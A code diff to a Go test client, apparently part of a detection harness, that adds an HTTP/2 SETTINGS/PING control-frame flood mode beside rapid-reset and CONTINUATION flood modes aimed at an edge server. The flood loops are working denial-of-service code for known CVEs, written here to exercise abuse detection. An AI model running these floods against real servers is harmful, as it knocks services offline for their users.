@@ -1,5 +1,5 @@
-// evaders/h2-rapid-reset/main — HTTP/2 Rapid Reset (CVE-2023-44487) flood against the edge.
-// Mints a session, floods HEADERS+RST_STREAM, then a final request so the detector can attribute the abuse.
+// evaders/h2-rapid-reset/main — HTTP/2 frame-abuse floods against the edge (rapid-reset / continuation / control).
+// Mints a session, runs the KS_MODE flood, then a final request so the detector can attribute the abuse.
 
 package main
 
@@ -106,9 +106,25 @@ func main() {
 	}
 
 	// 2. The flood. KS_MODE=continuation runs the CVE-2024-27316 shape (one open HEADERS followed by a
-	// stream of empty CONTINUATION frames); the default is the CVE-2023-44487 rapid reset.
+	// stream of empty CONTINUATION frames); KS_MODE=controlflood runs the 2019 control-frame floods
+	// (CVE-2019-9515 SETTINGS / CVE-2019-9512 PING); the default is the CVE-2023-44487 rapid reset.
 	sent := 0
-	if env("KS_MODE", "rapidreset") == "continuation" {
+	if env("KS_MODE", "rapidreset") == "controlflood" {
+		// Spam empty SETTINGS and (non-ACK) PING frames — a real client sends one preface SETTINGS and rarely
+		// a PING, never hundreds. The edge's ControlFrameFlood (Settings+Pings >= 100) trips → net.h2_control_flood.
+		for i := 0; i < floods; i++ {
+			var werr error
+			if i%2 == 0 {
+				werr = fr.WriteSettings()
+			} else {
+				werr = fr.WritePing(false, [8]byte{byte(i)})
+			}
+			if werr != nil {
+				break // server's own control-flood mitigation may have closed the connection
+			}
+			sent++
+		}
+	} else if env("KS_MODE", "rapidreset") == "continuation" {
 		// HEADERS on stream 3 without END_HEADERS, then empty CONTINUATION frames; the last sets
 		// END_HEADERS so the (otherwise valid, empty-continued) request completes and a handler runs.
 		hb.Reset()
